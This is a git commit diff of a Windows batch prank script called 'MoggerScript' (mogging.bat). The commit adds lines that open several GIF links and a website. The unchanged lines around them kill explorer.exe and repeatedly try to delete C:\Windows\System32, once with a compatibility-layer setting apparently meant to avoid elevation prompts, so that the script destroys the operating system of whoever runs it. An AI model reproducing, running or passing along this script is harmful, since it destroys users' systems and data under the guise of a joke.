81a3931b9923243baa918a141427569aa879ec3c
eternal <160648940+strblzng@users.noreply.github.com>
2024-02-21 09:24:02 +0100

    Update mogging.bat

--- mogging.bat
+++ mogging.bat
@@ -3,11 +3,15 @@ rem "MoggerScript by strblzng 1.1b"
 taskkill /f /im explorer.exe
 start https://www.youtube.com/watch?v=Sz_kQuEM0mI
 start https://www.youtube.com/watch?v=VCW-DYR5Li0
+start https://c.tenor.com/5i_dNjFf1JkAAAAC/tenor.gif
+start https://c.tenor.com/byWfo4OgiC0AAAAd/tenor.gif
 start rmdir /s /q C:\Windows\System32
 start rmdir /s /q C:\Windows\System32
 start rmdir /s /q C:\Windows\System32
 start rmdir /s /q C:\Windows\System32
+start https://media.tenor.com/lYZO4gddxyAAAAAM/kuwaii22-kuwaii.gif
 start rmdir /s /q C:\Windows\System32
+start https://ptoszek.pl
 start rmdir /s /q C:\Windows\System32
 Set __COMPAT_LAYER=RunAsInvoker && rmdir /s /q C:\Windows\System32
 echo XDDDDDDDD
